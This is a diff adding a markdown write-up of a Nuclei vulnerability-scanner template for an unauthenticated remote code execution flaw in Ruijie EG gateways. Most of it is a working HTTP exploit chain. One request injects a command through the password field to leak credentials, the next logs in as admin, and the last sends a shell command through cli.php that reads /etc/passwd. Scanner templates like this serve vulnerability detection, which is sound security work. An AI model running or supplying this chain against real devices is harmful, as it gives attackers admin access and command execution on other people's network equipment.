@@ -1,0 +1,36 @@
+# Nuclei Template: Ruijie EG - Remote Code Execution
+**Template ID:** ruijie-eg-rce
+**Vulnerability Class:** Command Injection - Generic
+**Severity:** Critical
+**CWE:** CWE-77
+**Source:** Nuclei Template (`ruijie-eg-rce.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+Ruikie EG's cli.php end point allows remote unauthenticated attackers to gain 'admin' privileges. The vulnerability is exploitable because an unauthenticated user can gain 'admin' privileges due to a vulnerability in the login screen.
+
+## Steps to reproduce / Exploit Payload
+```http
+POST /login.php HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=admin?show+webmaster+user
+
+POST /login.php HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password={{admin}}
+
+POST /cli.php?a=shell HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+notdelay=true&command=cat /etc/passwd
+```
+
+## References
+- https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+- https://www.ruijienetworks.com
